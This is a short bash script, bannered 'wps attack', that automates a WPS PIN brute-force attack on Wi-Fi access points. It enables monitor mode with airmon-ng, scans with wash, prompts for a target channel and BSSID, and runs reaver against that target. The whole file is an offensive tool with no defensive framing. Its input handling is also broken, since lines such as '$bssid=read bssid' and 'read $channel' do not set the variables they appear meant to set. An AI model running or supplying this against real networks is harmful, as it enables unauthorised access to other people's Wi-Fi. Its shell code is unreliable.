#!/bin/bash
clear
echo starting monitor mode 
airmon-ng start wlan0
clear
tput setaf 1; echo " 
                               __    __                 __    
__  _  _______  ______ _____ _/  |__/  |______    ____ |  | __
\ \/ \/ |____ \/  ___/ \__  \\   __\   __\__  \ _/ ___\|  |/ /
 \     /|  |_> >___ \   / __ \|  |  |  |  / __ \\  \___|    < 
  \/\_/ |   __/____  > (____  /__|  |__| (____  /\___  >__|_ \
        |__|       \/       \/                \/     \/     \/"
$bssid=read bssid
xterm  -e wash -i wlan0mon
read -p "Press enter to continue"
echo input the access point channel
read $channel
echo input bssid
read $bssid
 echo "Starting reaver"
echo  reaver -i wlan0mon -b $bssid -v -c $channel
reaver -i wlan0mon -b $bssid -v -c $channel

